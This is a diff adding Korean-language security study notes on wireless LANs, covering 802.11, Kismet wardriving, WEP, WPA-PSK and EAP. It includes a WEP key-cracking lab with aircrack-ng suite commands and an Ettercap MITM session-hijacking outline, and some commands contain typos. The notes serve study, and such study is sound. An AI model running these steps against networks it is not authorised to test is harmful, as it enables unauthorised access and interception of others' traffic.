@@ -914,6 +914,75 @@
     - SSL Strip 대책
         - HTTP가 SSL로 잘 접속되고 있는지 확인
      
+27. 무선 랜
+    - IEEE 802.11
+        - 무선랜 표준 (유선은 802.3)
+        - 현재는 `.11n`이 많이 쓰임. 그 이상은 고가의 장비.
+    - 통신범위
+        - 지향성 / 무지향성
+            - 무선은 대부분 무지향성.
+            - 많은 사람이 접속할 수 있도록 하기 위함.
+    - AP 정보 수집 실습
+        - Kali에서 Kisnrnet 프로그램 사용
+        - wardriving : 신호 기반으로 무선랜 위치를 수집
+        - `sudo kismet`
+            - 최신버전은 web으로 띄워줌. 2501 포트.
+    - 암호화 프로토콜
+        - WEP(Wired Equivalent Privacy)
+            - RC4를 사용
+            - WEB KEY 크랙 실습
+                - `ifconfig wlan0 down` 일단 랜 죽임
+                - `airmon-ng start wlan0`
+                - 모니터링 모드 설정
+                    - `sudo iwconfig`
+                - 공격 대상 ap 설정
+                    - `airodump-ng wlan0mon`
+                - IV 수집하기
+                    - `airodump-ng --ivs -c 1 -w WEP_DUMP --bssid {MAC} wlan0mon`
+                - `aircrack-ng -b {MAC} WEB_DUMP-01.ivs`
+                    - 안될 수도 있음. -> 강제로 패킷 생성해야됨
+                - `airplay-ng -1 -0 -a {MAC} -H {MAC} wlan0mon`
+        - WPA-PSK
+            -  WEP 보완
+            - 딕셔너리만 잘 구성되어있고, 약한 비밀번호 설정 시 공격 가능
+            - 보안설정
+                - AP 수신거리 조정
+                - DHCP 중지
+                - MAC 필터링
+                    - 허용 MAC 관리
+                - 요즘에는 AP에 WIPS(Wireless IPS)와 F/W이 합쳐진 상태로 나오기도 하기 때문에 이를 통해 관리할 수 있음.
+            - 세션 하이재킹 실습
+                - Ettercap 사용
+                - WiFi 비밀번호 설정
+                - 타겟 스캔
+                - 타겟 설정
+                - MITM
+                - Wireshark로 분석
+        - EAP
+            - 중앙집중화된 무선랜 인증방식
+            - RADIUS 서버와 클라이언트가 상호인증
+            - 순서
+                - ![image](https://user-images.githubusercontent.com/44149738/143725568-c383a755-1044-4bca-8021-0c1d55107079.png)
+                - ![image](https://user-images.githubusercontent.com/44149738/143725577-0cd5a7c4-6976-4e9a-8730-6a98532546e2.png)
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
